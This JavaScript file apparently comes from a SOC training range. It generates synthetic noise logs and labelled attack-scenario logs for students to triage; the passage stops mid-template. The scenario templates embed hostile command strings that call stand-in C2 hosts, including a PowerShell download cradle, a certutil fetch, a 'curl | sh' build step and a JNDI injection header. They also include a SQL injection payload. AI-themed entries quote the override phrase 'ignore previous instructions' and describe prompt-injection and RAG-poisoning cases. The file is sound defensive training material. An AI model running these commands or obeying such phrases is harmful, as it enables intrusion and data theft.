/* SOC Range :: log-engine.js
 * The data heart. Produces a continuous, varied stream of believable noise
 * across five log sources, plus renders scenario attack narratives that
 * reference the shared entity table. Pure functions, no DOM, runs in a worker.
 *
 * Every log object has a consistent shape:
 *   { id, ts, simT, source, severity, host, src_ip, dst_ip, user,
 *     msg, raw, fields, origin, truthLabel, mitre }
 * origin     : "noise" | "scenario"
 * truthLabel : "benign" | "suspicious" | "malicious"   (hidden from students)
 * mitre      : ATT&CK technique id, when applicable
 */
(function () {
  "use strict";
  var SOC = (self.SOC = self.SOC || {});
  var E = SOC.entities;

  var SOURCES = ["windows", "syslog", "firewall", "cloudtrail", "web"];

  var PROCESSES = ["chrome.exe", "outlook.exe", "explorer.exe", "svchost.exe",
    "teams.exe", "winword.exe", "excel.exe", "OneDrive.exe", "msedge.exe",
    "RuntimeBroker.exe", "SearchHost.exe", "Code.exe"];
  var WIN_BENIGN = [
    { id: 4624, t: "An account was successfully logged on", sev: "info" },
    { id: 4634, t: "An account was logged off", sev: "info" },
    { id: 4672, t: "Special privileges assigned to new logon", sev: "info" },
    { id: 4688, t: "A new process has been created", sev: "info" },
    { id: 4798, t: "A user's local group membership was enumerated", sev: "low" },
    { id: 5379, t: "Credential Manager credentials were read", sev: "info" },
    { id: 4625, t: "An account failed to log on", sev: "low" },
    { id: 7045, t: "A new service was installed", sev: "low" }
  ];
  var SYSLOG_BENIGN = [
    { proc: "sshd", msg: "Accepted publickey for admin from 10.20.9.2 port 51234", sev: "info" },
    { proc: "cron", msg: "(root) CMD (/usr/lib/sysstat/sa1 1 1)", sev: "info" },
    { proc: "systemd", msg: "Started Session of user backup", sev: "info" },
    { proc: "kernel", msg: "EXT4-fs (sda1): mounted filesystem with ordered data mode", sev: "info" },
    { proc: "named", msg: "client query: outlook.office365.com IN A", sev: "info" },
    { proc: "sshd", msg: "Failed password for invalid user test from 10.20.6.21 port 40221", sev: "low" }
  ];
  var WEB_PATHS = ["/", "/portal/login", "/portal/dashboard", "/api/patients",
    "/api/appointments", "/assets/app.css", "/assets/app.js", "/billing/invoice",
    "/health", "/favicon.ico", "/api/lab-results"];
  var WEB_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/17.4",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/124.0",
    "python-requests/2.31.0",
    "curl/8.4.0"
  ];
  var CT_BENIGN = ["GetObject", "ListBucket", "DescribeInstances", "AssumeRole",
    "GetCallerIdentity", "DescribeVolumes", "ConsoleLogin", "PutMetricData"];

  var idCounter = 0;
  function nid() { idCounter += 1; return "L" + idCounter.toString(36); }
  function pad(n) { return n < 10 ? "0" + n : "" + n; }
  function tstamp(ts) {
    var d = new Date(ts);
    return d.getUTCFullYear() + "-" + pad(d.getUTCMonth() + 1) + "-" +
      pad(d.getUTCDate()) + "T" + pad(d.getUTCHours()) + ":" +
      pad(d.getUTCMinutes()) + ":" + pad(d.getUTCSeconds()) + "Z";
  }

  // ---------------- NOISE ----------------
  function makeNoise(rng, entities, ts) {
    var source = rng.weighted([
      { v: "windows", w: 34 }, { v: "firewall", w: 24 },
      { v: "web", w: 18 }, { v: "syslog", w: 14 }, { v: "cloudtrail", w: 10 }
    ]);
    var host = rng.pick(E.INTERNAL_HOSTS);
    var user = rng.pick(E.USERS);
    var ext = rng.pick(E.BENIGN_EXTERNAL);
    var base = {
      id: nid(), ts: ts, source: source, origin: "noise",
      truthLabel: "benign", mitre: null, host: host.name,
      src_ip: host.ip, dst_ip: null, user: user.sam, severity: "info", fields: {}
    };

    if (source === "windows") {
      var ev = rng.pick(WIN_BENIGN);
      var proc = rng.pick(PROCESSES);
      base.severity = ev.sev;
      base.fields = { EventID: ev.id, Process: proc, LogonType: rng.pick([2, 3, 7, 10]) };
      base.msg = ev.t + " (" + proc + ")";
      base.raw = tstamp(ts) + " " + host.name + " Security EventID=" + ev.id +
        " User=" + user.sam + " Process=" + proc + " :: " + ev.t;
    } else if (source === "firewall") {
      var allow = rng.bool(0.82);
      var dport = rng.pick([443, 443, 443, 80, 53, 123, 3389, 445, 22]);
      base.dst_ip = ext.ip;
      base.severity = allow ? "info" : "low";
      base.fields = { action: allow ? "ALLOW" : "DENY", dport: dport, proto: "TCP" };
      base.msg = (allow ? "ALLOW" : "DENY") + " " + host.ip + " -> " + ext.ip + ":" + dport;
      base.raw = tstamp(ts) + " fw01 " + (allow ? "ALLOW" : "DENY") +
        " proto=TCP src=" + host.ip + " dst=" + ext.ip + " dport=" + dport;
    } else if (source === "web") {
      var path = rng.pick(WEB_PATHS);
      var status = rng.weighted([{ v: 200, w: 70 }, { v: 302, w: 12 },
        { v: 404, w: 10 }, { v: 401, w: 5 }, { v: 500, w: 3 }]);
      base.host = "SRV-WEB-01";
      base.src_ip = "203.0.113." + rng.int(2, 250);
      base.severity = status >= 500 ? "low" : "info";
      base.fields = { method: rng.pick(["GET", "GET", "POST"]), path: path, status: status };
      base.msg = base.fields.method + " " + path + " " + status;
      base.raw = base.src_ip + ' - - [' + tstamp(ts) + '] "' + base.fields.method +
        " " + path + ' HTTP/1.1" ' + status + " " + rng.int(120, 9000) +
        ' "' + rng.pick(WEB_UA) + '"';
    } else if (source === "syslog") {
      var s = rng.pick(SYSLOG_BENIGN);
      base.host = rng.pick(["SRV-EHR-01", "SRV-FILE-01", "SRV-WEB-01", "DC-01"]);
      base.severity = s.sev;
      base.fields = { process: s.proc };
      base.msg = s.proc + ": " + s.msg;
      base.raw = tstamp(ts) + " " + base.host + " " + s.proc + "[" + rng.int(200, 9000) + "]: " + s.msg;
    } else {
      var evt = rng.pick(CT_BENIGN);
      base.host = "aws-account-4417";
      base.src_ip = host.ip;
      base.user = rng.pick(["svc_backup", "jsmith", "terraform-ci", "svc_sql"]);
      base.fields = { eventName: evt, awsRegion: "us-east-1" };
      base.msg = "CloudTrail " + evt + " by " + base.user;
      base.raw = tstamp(ts) + ' {"eventName":"' + evt + '","userIdentity":"' +
        base.user + '","sourceIPAddress":"' + host.ip + '","awsRegion":"us-east-1"}';
    }
    return base;
  }

  // ---------------- SCENARIO TEMPLATES ----------------
  // Each returns a partial log enriched with entity values. The scenario
  // logScript names a template and may pass extra params.
  var T = {
    rdp_fail: function (rng, en, ts, p) {
      return wrap(ts, "windows", "medium", en["host.victim"], en["ip.attacker"], null, "Administrator",
        "Failed RDP logon (4625) bad password",
        tstamp(ts) + " " + en["host.victim"] + " Security EventID=4625 User=Administrator src=" +
        en["ip.attacker"] + " LogonType=10 Status=0xC000006A :: An account failed to log on",
        { EventID: 4625, LogonType: 10, src_ip: en["ip.attacker"] }, "suspicious", "T1110");
    },
    rdp_success: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.victim"], en["ip.attacker"], null, "Administrator",
        "Successful RDP logon (4624) after repeated failures",
        tstamp(ts) + " " + en["host.victim"] + " Security EventID=4624 User=Administrator src=" +
        en["ip.attacker"] + " LogonType=10 :: An account was successfully logged on",
        { EventID: 4624, LogonType: 10, src_ip: en["ip.attacker"] }, "malicious", "T1110");
    },
    phish_received: function (rng, en, ts) {
      return wrap(ts, "syslog", "medium", "SRV-EHR-01", null, null, en["user.compromised"],
        "Inbound email with link to " + en["domain.phish"],
        tstamp(ts) + " mailgw postfix: from=<security@" + en["domain.phish"] +
        "> to=<" + en["user.compromised"] + "@bvhn.org> subj='Action required: verify your mailbox' url=" + en["url.phish"],
        { sender: "security@" + en["domain.phish"], url: en["url.phish"] }, "suspicious", "T1566");
    },
    macro_exec: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.victim"], null, null, en["user.victim"],
        "winword.exe spawned powershell.exe (suspicious child process)",
        tstamp(ts) + " " + en["host.victim"] + " Security EventID=4688 Parent=winword.exe Child=powershell.exe User=" +
        en["user.victim"] + " CmdLine='powershell -nop -w hidden -enc <base64>'",
        { EventID: 4688, parent: "winword.exe", child: "powershell.exe" }, "malicious", "T1204");
    },
    ps_encoded: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.victim"], null, en["ip.c2"], en["user.victim"],
        "Encoded PowerShell download cradle to " + en["domain.c2"],
        tstamp(ts) + " " + en["host.victim"] + " PowerShell/4104 ScriptBlock='IEX(New-Object Net.WebClient).DownloadString(''http://" +
        en["domain.c2"] + "/a'')' Hash=" + en["hash.tool"],
        { EventID: 4104, hash: en["hash.tool"], domain: en["domain.c2"] }, "malicious", "T1059.001");
    },
    c2_beacon: function (rng, en, ts, p) {
      var bytes = (p && p.bytes) || rng.int(800, 1400);
      return wrap(ts, "firewall", "high", en["host.victim"], en["ip.victim"], en["ip.c2"], null,
        "Periodic outbound TLS to suspected C2 " + en["ip.c2"],
        tstamp(ts) + " fw01 ALLOW proto=TCP src=" + en["ip.victim"] + " dst=" + en["ip.c2"] +
        " dport=443 bytes=" + bytes + " interval~60s",
        { action: "ALLOW", dport: 443, dst_ip: en["ip.c2"], bytes: bytes }, "malicious", "T1071.001");
    },
    smb_lateral: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.dc"], en["ip.victim"], en["ip.dc"], en["user.victim"],
        "Remote SMB admin share access to DC-01 (lateral movement)",
        tstamp(ts) + " DC-01 Security EventID=5140 Share=\\\\DC-01\\ADMIN$ src=" + en["ip.victim"] +
        " User=" + en["user.victim"] + " LogonType=3",
        { EventID: 5140, share: "ADMIN$", src_ip: en["ip.victim"] }, "malicious", "T1021.002");
    },
    file_encrypt: function (rng, en, ts) {
      return wrap(ts, "windows", "critical", en["host.file"], null, null, en["user.victim"],
        "Mass file modification: 4,212 files renamed to .lockbvhn in 90s",
        tstamp(ts) + " SRV-FILE-01 Sysmon/11 FileCreate Image=" + en["hash.malware"] +
        " ext=.lockbvhn count=4212 path=\\\\SRV-FILE-01\\shares",
        { EventID: 11, ext: ".lockbvhn", count: 4212, hash: en["hash.malware"] }, "malicious", "T1486");
    },
    ransom_note: function (rng, en, ts) {
      return wrap(ts, "syslog", "critical", "SRV-FILE-01", null, null, null,
        "Ransom note RESTORE-FILES.txt written to every share root",
        tstamp(ts) + " SRV-FILE-01 fileaudit: created RESTORE-FILES.txt in 38 directories contact=" + en["domain.exfil"],
        { file: "RESTORE-FILES.txt" }, "malicious", "T1486");
    },
    exfil_https: function (rng, en, ts, p) {
      var mb = (p && p.mb) || rng.int(40, 900);
      return wrap(ts, "firewall", "high", en["host.victim"], en["ip.victim"], en["ip.exfil"], null,
        "Large outbound transfer " + mb + "MB to " + en["domain.exfil"],
        tstamp(ts) + " fw01 ALLOW proto=TCP src=" + en["ip.victim"] + " dst=" + en["ip.exfil"] +
        " dport=443 bytes=" + (mb * 1048576) + " host=" + en["domain.exfil"],
        { action: "ALLOW", dport: 443, bytes: mb * 1048576, domain: en["domain.exfil"] }, "malicious", "T1041");
    },
    dns_tunnel: function (rng, en, ts) {
      var label = rng.hex(28);
      return wrap(ts, "syslog", "medium", "DC-01", en["ip.victim"], null, null,
        "High-entropy DNS TXT queries to " + en["domain.c2"] + " (possible tunneling)",
        tstamp(ts) + " DC-01 named: client " + en["ip.victim"] + " query: " + label + "." +
        en["domain.c2"] + " IN TXT",
        { qtype: "TXT", domain: en["domain.c2"], label: label }, "suspicious", "T1071.004");
    },
    port_scan: function (rng, en, ts) {
      return wrap(ts, "firewall", "medium", null, en["ip.attacker"], "10.10.1.0/24", null,
        "Horizontal port scan from " + en["ip.attacker"] + " across server VLAN",
        tstamp(ts) + " fw01 DENY proto=TCP src=" + en["ip.attacker"] +
        " dst=10.10.1." + rng.int(2, 254) + " dport=" + rng.pick([22, 23, 135, 445, 3389, 1433, 8080]),
        { action: "DENY", src_ip: en["ip.attacker"] }, "suspicious", "T1046");
    },
    ct_public_bucket: function (rng, en, ts) {
      return wrap(ts, "cloudtrail", "critical", "aws-account-4417", en["ip.attacker"], null, en["aws.access_key"],
        "S3 bucket ACL set to public-read on " + en["aws.bucket"],
        tstamp(ts) + ' {"eventName":"PutBucketAcl","requestParameters":{"bucket":"' + en["aws.bucket"] +
        '","x-amz-acl":"public-read"},"sourceIPAddress":"' + en["ip.attacker"] + '"}',
        { eventName: "PutBucketAcl", bucket: en["aws.bucket"], acl: "public-read" }, "malicious", "T1530");
    },
    ct_foreign_login: function (rng, en, ts) {
      return wrap(ts, "cloudtrail", "high", "aws-account-4417", en["ip.attacker"], null, en["user.compromised"],
        "Root-equivalent ConsoleLogin from " + en["geo.adversary"] + " without MFA",
        tstamp(ts) + ' {"eventName":"ConsoleLogin","additionalEventData":{"MFAUsed":"No"},"sourceIPAddress":"' +
        en["ip.attacker"] + '","geo":"' + en["geo.adversary"] + '"}',
        { eventName: "ConsoleLogin", mfa: "No", geo: en["geo.adversary"] }, "malicious", "T1078.004");
    },
    oauth_consent: function (rng, en, ts) {
      return wrap(ts, "cloudtrail", "high", "m365-tenant", en["ip.attacker"], null, en["user.compromised"],
        "Risky OAuth consent: app granted Mail.Read and offline_access",
        tstamp(ts) + ' AAD AuditLog: Consent to application "PDF-Helper-Pro" scopes=Mail.Read,Files.Read.All,offline_access user=' +
        en["user.compromised"] + " ip=" + en["ip.attacker"],
        { app: "PDF-Helper-Pro", scopes: "Mail.Read,offline_access" }, "malicious", "T1528");
    },
    aitm_token: function (rng, en, ts) {
      return wrap(ts, "cloudtrail", "critical", "m365-tenant", en["ip.attacker"], null, en["user.compromised"],
        "Sign-in with stolen session token, impossible travel from " + en["geo.adversary"],
        tstamp(ts) + ' AAD SignIn: user=' + en["user.compromised"] + " result=Success token=" +
        en["token.session"] + " ip=" + en["ip.attacker"] + " geo=" + en["geo.adversary"] + " MFA=satisfied(token)",
        { token: en["token.session"], geo: en["geo.adversary"], mfa: "token-replay" }, "malicious", "T1539");
    },
    inbox_rule: function (rng, en, ts) {
      return wrap(ts, "cloudtrail", "high", "m365-tenant", en["ip.attacker"], null, en["user.compromised"],
        "Mailbox rule created to forward and delete finance messages",
        tstamp(ts) + ' AAD: New-InboxRule name="..." forwardTo=external moveToFolder=RSS deleteMessage=true user=' +
        en["user.compromised"],
        { rule: "auto-forward-external", deleteMessage: true }, "malicious", "T1114.003");
    },
    lolbin: function (rng, en, ts, p) {
      var tool = (p && p.tool) || "certutil.exe";
      return wrap(ts, "windows", "high", en["host.victim"], null, en["ip.c2"], en["user.victim"],
        "Living off the land: " + tool + " used to fetch remote payload",
        tstamp(ts) + " " + en["host.victim"] + " Security EventID=4688 Image=" + tool +
        " CmdLine='" + tool + " -urlcache -f http://" + en["domain.c2"] + "/p.txt p.exe'",
        { EventID: 4688, image: tool, domain: en["domain.c2"] }, "malicious", "T1105");
    },
    web_sqli: function (rng, en, ts, p) {
      var ok = p && p.success;
      return wrap(ts, "web", ok ? "high" : "medium", en["host.web"], en["ip.attacker"], null, null,
        (ok ? "SQL injection returned patient rows" : "SQL injection attempt") + " on /portal/search",
        tstamp(ts) + ' ' + en["host.web"] + ' ' + en["ip.attacker"] + ' "GET /portal/search?q=a%27%20UNION%20SELECT%20mrn,ssn%20FROM%20patients-- HTTP/1.1" ' +
        (ok ? "200 88412" : "500 712") + ' "sqlmap/1.7"',
        { status: ok ? 200 : 500, attack: "sqli", table: "patients", src_ip: en["ip.attacker"] }, "malicious", "T1190");
    },
    cve_exploit: function (rng, en, ts) {
      return wrap(ts, "web", "critical", en["host.app"], en["ip.attacker"], null, null,
        "Exploit of public-facing app: JNDI lookup in request header (CVE pattern)",
        tstamp(ts) + ' ' + en["host.app"] + ' ' + en["ip.attacker"] +
        ' "POST /api/login HTTP/1.1" 200 0 User-Agent:"${jndi:ldap://' + en["ip.c2"] + ':1389/a}"',
        { attack: "jndi-injection", dst: en["ip.c2"], src_ip: en["ip.attacker"] }, "malicious", "T1190");
    },
    web_shell: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.web"], en["ip.attacker"], null, "IIS APPPOOL",
        "Web server process w3wp.exe spawned cmd.exe (web shell)",
        tstamp(ts) + " " + en["host.web"] + " Security EventID=4688 Parent=w3wp.exe Child=cmd.exe CmdLine='cmd /c whoami' src=" + en["ip.attacker"],
        { EventID: 4688, parent: "w3wp.exe", child: "cmd.exe", shell: "uploads/cmd.aspx" }, "malicious", "T1505.003");
    },
    impossible_travel: function (rng, en, ts, p) {
      var geo = (p && p.geo) || en["geo.adversary"];
      var ip = (p && p.home) ? en["ip.victim"] : en["ip.attacker"];
      return wrap(ts, "cloudtrail", "high", "m365-tenant", ip, null, en["user.compromised"],
        "Sign-in for " + en["user.compromised"] + " from " + geo,
        tstamp(ts) + ' AAD SignIn: user=' + en["user.compromised"] + " result=Success ip=" + ip + " geo=" + geo + " MFA=satisfied",
        { result: "Success", geo: geo, src_ip: ip }, (p && p.home) ? "benign" : "suspicious", "T1078.004");
    },
    mass_download: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.file"], null, null, en["user.insider"],
        en["user.insider"] + " bulk-accessed 1,940 patient files in 4 minutes",
        tstamp(ts) + " SRV-FILE-01 Security EventID=5145 Share=\\\\SRV-FILE-01\\PHI User=" + en["user.insider"] +
        " AccessCount=1940 window=240s",
        { EventID: 5145, share: "PHI", user: en["user.insider"], count: 1940 }, "suspicious", "T1530");
    },
    cloud_upload: function (rng, en, ts, p) {
      var mb = (p && p.mb) || rng.int(120, 600);
      return wrap(ts, "firewall", "high", en["host.victim"], en["ip.victim"], en["ip.exfil"], en["user.insider"],
        "Upload of " + mb + "MB to personal cloud " + en["domain.cloud"],
        tstamp(ts) + " fw01 ALLOW proto=TCP src=" + en["ip.victim"] + " dst=" + en["ip.exfil"] +
        " dport=443 bytes=" + (mb * 1048576) + " host=" + en["domain.cloud"],
        { action: "ALLOW", dport: 443, bytes: mb * 1048576, domain: en["domain.cloud"] }, "malicious", "T1567.002");
    },
    bec_wire: function (rng, en, ts) {
      return wrap(ts, "syslog", "high", "SRV-EHR-01", en["ip.attacker"], null, en["user.compromised"],
        "Wire-change request sent from compromised mailbox to finance",
        tstamp(ts) + " mailgw: from=<" + en["user.compromised"] + "@bvhn.org> to=<" + en["user.finance"] +
        "@bvhn.org> subj='URGENT: update vendor banking details before EOD' reply-to=" + en["domain.phish"],
        { subject: "vendor banking change", replyTo: en["domain.phish"] }, "malicious", "T1114.003");
    },
    cryptomine: function (rng, en, ts) {
      return wrap(ts, "firewall", "medium", en["host.app"], en["ip.victim"], en["ip.c2"], null,
        "Stratum mining-pool connection from " + en["host.app"] + " (CPU 98%)",
        tstamp(ts) + " fw01 ALLOW proto=TCP src=" + en["ip.victim"] + " dst=" + en["ip.c2"] +
        " dport=3333 proto-app=stratum cpu=98%",
        { dport: 3333, app: "stratum", cpu: "98%" }, "malicious", "T1496");
    },
    pth: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.dc"], en["ip.victim"], en["ip.dc"], en["user.admin"],
        "NTLM network logon to DC-01 with no interactive logon first (pass-the-hash)",
        tstamp(ts) + " DC-01 Security EventID=4624 LogonType=3 AuthPackage=NTLM User=" + en["user.admin"] +
        " src=" + en["ip.victim"] + " (no prior 4648)",
        { EventID: 4624, LogonType: 3, auth: "NTLM", src_ip: en["ip.victim"] }, "malicious", "T1550.002");
    },
    kerberoast: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.dc"], en["ip.victim"], en["ip.dc"], en["user.compromised"],
        "Burst of Kerberos TGS requests with weak RC4 encryption (kerberoasting)",
        tstamp(ts) + " DC-01 Security EventID=4769 ServiceName=" + en["user.svc"] +
        " TicketEncryption=0x17(RC4) src=" + en["ip.victim"] + " count=24",
        { EventID: 4769, enc: "RC4", count: 24, src_ip: en["ip.victim"] }, "malicious", "T1558.003");
    },
    priv_esc: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.victim"], null, null, en["user.compromised"],
        "Account added to Domain Admins by " + en["user.compromised"],
        tstamp(ts) + " DC-01 Security EventID=4728 Group='Domain Admins' Member=" + en["user.compromised"] +
        " By=" + en["user.compromised"],
        { EventID: 4728, group: "Domain Admins", member: en["user.compromised"] }, "malicious", "T1098");
    },
    iam_persist: function (rng, en, ts) {
      return wrap(ts, "cloudtrail", "critical", "aws-account-4417", en["ip.attacker"], null, en["aws.access_key"],
        "Leaked key created a new IAM user and attached AdministratorAccess",
        tstamp(ts) + ' {"eventName":"AttachUserPolicy","requestParameters":{"policyArn":"arn:aws:iam::aws:policy/AdministratorAccess","userName":"svc-helper"},"accessKeyId":"' +
        en["aws.access_key"] + '","sourceIPAddress":"' + en["ip.attacker"] + '"}',
        { eventName: "AttachUserPolicy", policy: "AdministratorAccess", newUser: "svc-helper" }, "malicious", "T1098");
    },
    usb_mount: function (rng, en, ts) {
      return wrap(ts, "windows", "medium", en["host.victim"], null, null, en["user.victim"],
        "New USB mass-storage device mounted, then an autorun executable launched",
        tstamp(ts) + " " + en["host.victim"] + " Security EventID=6416 DeviceClass=USBSTOR Instance='USBSTOR\\Disk&Ven_Kingston' :: external media recognized; autorun.exe spawned",
        { EventID: 6416, device: "USBSTOR", autorun: true }, "suspicious", "T1091");
    },
    sched_task: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.victim"], null, en["ip.c2"], en["user.victim"],
        "Scheduled task created to run a hidden PowerShell payload at logon",
        tstamp(ts) + " " + en["host.victim"] + " Security EventID=4698 TaskName='\\Microsoft\\Windows\\UpdateSync' Action='powershell -nop -w hidden -enc <b64>' Trigger=ONLOGON",
        { EventID: 4698, task: "UpdateSync", trigger: "ONLOGON" }, "malicious", "T1053.005");
    },
    defender_off: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.victim"], null, null, en["user.victim"],
        "Microsoft Defender real-time protection disabled via PowerShell",
        tstamp(ts) + " " + en["host.victim"] + " Defender/5001 RealTimeProtection=Disabled CmdLine='Set-MpPreference -DisableRealtimeMonitoring $true'",
        { EventID: 5001, action: "disable-defender" }, "malicious", "T1562.001");
    },
    mfa_fatigue: function (rng, en, ts) {
      return wrap(ts, "cloudtrail", "high", "m365-tenant", en["ip.attacker"], null, en["user.compromised"],
        "Repeated MFA push notifications to " + en["user.compromised"] + " (push bombing)",
        tstamp(ts) + ' AAD SignIn: user=' + en["user.compromised"] + " mfaResult=PendingApproval pushCount=14 ip=" + en["ip.attacker"] + " geo=" + en["geo.adversary"],
        { mfaResult: "PendingApproval", pushCount: 14, geo: en["geo.adversary"] }, "suspicious", "T1621");
    },
    spam_outbound: function (rng, en, ts) {
      return wrap(ts, "syslog", "medium", "SRV-EHR-01", null, null, en["user.compromised"],
        "Compromised mailbox " + en["user.compromised"] + " sending high-volume outbound mail",
        tstamp(ts) + " mailgw postfix: from=<" + en["user.compromised"] + "@bvhn.org> recipients=312 subject='Invoice past due' rate=high",
        { recipients: 312, rate: "high" }, "suspicious", "T1078");
    },
    db_dump: function (rng, en, ts, p) {
      var rows = (p && p.rows) || 480000;
      return wrap(ts, "syslog", "high", en["host.db"], en["ip.victim"], null, en["user.compromised"],
        "Bulk SELECT exported " + rows + " rows from the patients table",
        tstamp(ts) + " SRV-DB-01 mysqld: Query user=" + en["user.compromised"] + " 'SELECT * FROM patients INTO OUTFILE' rows=" + rows,
        { rows: rows, table: "patients", op: "OUTFILE" }, "malicious", "T1213");
    },
    supply_chain: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.app"], null, en["ip.c2"], "SYSTEM",
        "Vendor updater fetched a backdoored package, then beaconed out",
        tstamp(ts) + " " + en["host.app"] + " Sysmon/1 Image='C:\\Program Files\\VendorAgent\\update.exe' Hash=" + en["hash.malware"] + " child=rundll32.exe net=" + en["ip.c2"],
        { image: "update.exe", hash: en["hash.malware"], dst: en["ip.c2"] }, "malicious", "T1195.002");
    },
    web_deface: function (rng, en, ts) {
      return wrap(ts, "web", "high", en["host.web"], en["ip.attacker"], null, null,
        "Homepage modified: defacement content written to the index page",
        tstamp(ts) + ' ' + en["host.web"] + ' ' + en["ip.attacker"] + ' "PUT /index.html HTTP/1.1" 200 1842 "owned"',
        { method: "PUT", path: "/index.html", status: 200, attack: "defacement" }, "malicious", "T1491.001");
    },
    reg_runkey: function (rng, en, ts) {
      return wrap(ts, "windows", "high", en["host.victim"], null, null, en["user.victim"],
        "Registry Run key added for persistence",
        tstamp(ts) + " " + en["host.victim"] + " Sysmon/13 RegistrySet Key='HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater' Value='C:\\Users\\Public\\svc.exe'",
        { EventID: 13, key: "Run\\Updater", value: "svc.exe" }, "malicious", "T1547.001");
    },
    golden_ticket: function (rng, en, ts) {
      return wrap(ts, "windows", "critical", en["host.dc"], en["ip.victim"], en["ip.dc"], en["user.admin"],
        "Kerberos ticket with anomalous 10-year lifetime and no prior AS-REQ (forged TGT)",
        tstamp(ts) + " DC-01 Security EventID=4769 User=" + en["user.admin"] + " TicketOptions=0x40810000 lifetime=10y noPriorAS=true src=" + en["ip.victim"],
        { EventID: 4769, lifetime: "10y", forged: true }, "malicious", "T1558.001");
    },
    data_staging: function (rng, en, ts) {
      return wrap(ts, "windows", "medium", en["host.file"], null, null, en["user.compromised"],
        "Large RAR archive staged in a temp directory before exfiltration",
        tstamp(ts) + " SRV-FILE-01 Sysmon/11 FileCreate Image=rar.exe Target='C:\\Windows\\Temp\\backup_" + en["ticketSeed"] + ".rar' size=2.4GB",
        { tool: "rar.exe", size: "2.4GB", staged: true }, "suspicious", "T1074");
    },
    iam_enum: function (rng, en, ts) {
      return wrap(ts, "cloudtrail", "medium", "aws-account-4417", en["ip.attacker"], null, en["aws.access_key"],
        "Rapid IAM enumeration: ListUsers, ListRoles, GetAccountAuthorizationDetails",
        tstamp(ts) + ' {"eventName":"GetAccountAuthorizationDetails","sourceIPAddress":"' + en["ip.attacker"] + '","userIdentity":"' + en["aws.access_key"] + '","burst":true}',
        { eventName: "GetAccountAuthorizationDetails", recon: true }, "suspicious", "T1087.004");
    },
    cloud_crypto: function (rng, en, ts) {
      return wrap(ts, "cloudtrail", "high", "aws-account-4417", en["ip.attacker"], null, en["aws.access_key"],
        "Burst of large GPU instances launched in an unused region (cloud cryptomining)",
        tstamp(ts) + ' {"eventName":"RunInstances","requestParameters":{"instanceType":"p3.8xlarge","count":12,"region":"ap-south-1"},"sourceIPAddress":"' + en["ip.attacker"] + '"}',
        { eventName: "RunInstances", instanceType: "p3.8xlarge", count: 12 }, "malicious", "T1496");
    },
    llm_exfil: function (rng, en, ts, p) {
      var mb = (p && p.mb) || 60;
      return wrap(ts, "web", "high", en["host.app"], en["ip.victim"], en["ip.exfil"], en["user.compromised"],
        "AI assistant followed injected instructions and posted records to an external endpoint",
        tstamp(ts) + ' ' + en["host.app"] + ' "POST /agent/tool-call HTTP/1.1" 200 ' + (mb * 1048576) + ' tool=http_post dst=' + en["domain.exfil"] + ' note="ignore previous instructions"',
        { tool: "http_post", dst: en["domain.exfil"], bytes: mb * 1048576, attack: "prompt-injection" }, "malicious", "T1567");
    },
    vishing: function (rng, en, ts) {
      return wrap(ts, "syslog", "high", "helpdesk", en["ip.attacker"], null, en["user.finance"],
        "Help desk reset MFA for " + en["user.finance"] + " after a convincing phone request (cloned voice)",
        tstamp(ts) + " servicedesk: ticket=" + en["ticketSeed"] + " action='MFA reset' requestedBy=phone caller_verified=weak target=" + en["user.finance"],
        { action: "MFA reset", channel: "phone", verification: "weak" }, "suspicious", "T1621");
    },
    cicd_tamper: function (rng, en, ts) {
      return wrap(ts, "syslog", "high", en["host.app"], en["ip.attacker"], en["ip.c2"], en["user.compromised"],
        "CI/CD pipeline altered to inject a malicious build step that calls out",
        tstamp(ts) + " ci-runner: pipeline='deploy-prod' step-added='curl " + en["domain.c2"] + "/x | sh' actor=" + en["user.compromised"] + " approval=bypassed",
        { pipeline: "deploy-prod", injected: true, dst: en["domain.c2"] }, "malicious", "T1195.002");
    },
    password_spray: function (rng, en, ts) {
      return wrap(ts, "windows", "medium", en["host.dc"], en["ip.attacker"], en["ip.dc"], null,
        "Password spray: one password tried across many accounts from " + en["ip.attacker"],
        tstamp(ts) + " DC-01 Security EventID=4625 SprayPattern=1pwd/Nusers attempts=46 distinctUsers=46 src=" +
        en["ip.attacker"] + " Status=0xC000006A",
        { EventID: 4625, pattern: "password-spray", distinctUsers: 46, src_ip: en["ip.attacker"] }, "suspicious", "T1110.003");
    },
    ai_prompt_injection: function (rng, en, ts) {
      return wrap(ts, "web", "high", en["host.app"], en["ip.victim"], en["ip.exfil"], en["user.compromised"],
        "AI assistant followed hidden instructions embedded in a shared document",
        tstamp(ts) + " " + en["host.app"] + " aiproxy: agent=clinical-assistant action=tool_call tool=send_email to=" +
        en["domain.exfil"] + " trigger='instructions hidden in uploaded PDF' note='ignore previous rules'",
        { tool: "send_email", dst: en["domain.exfil"], attack: "indirect-prompt-injection" }, "malicious", "AML.T0051");
    },
    ai_data_leak: function (rng, en, ts, p) {
      var kb = (p && p.kb) || rng.int(40, 300);
      return wrap(ts, "web", "high", en["host.victim"], en["ip.victim"], null, en["user.compromised"],
        en["user.compromised"] + " pasted patient records into a public AI chatbot (shadow AI)",
        tstamp(ts) + " webproxy: user=" + en["user.compromised"] + " POST chat-public-llm.com bytes=" + (kb * 1024) +
        " category=GenAI dlp=PHI-detected action=ALLOW",
        { dst: "public-llm", dlp: "PHI-detected", category: "GenAI", bytes: kb * 1024 }, "suspicious", "AML.T0057");
    },
    ai_model_poison: function (rng, en, ts) {
      return wrap(ts, "syslog", "high", en["host.app"], en["ip.attacker"], null, en["user.compromised"],
        "Poisoned documents ingested into the RAG knowledge base behind the AI assistant",
        tstamp(ts) + " " + en["host.app"] + " rag-indexer: ingested 38 documents source=public-share flagged=poison-pattern actor=" +
        en["user.compromised"],
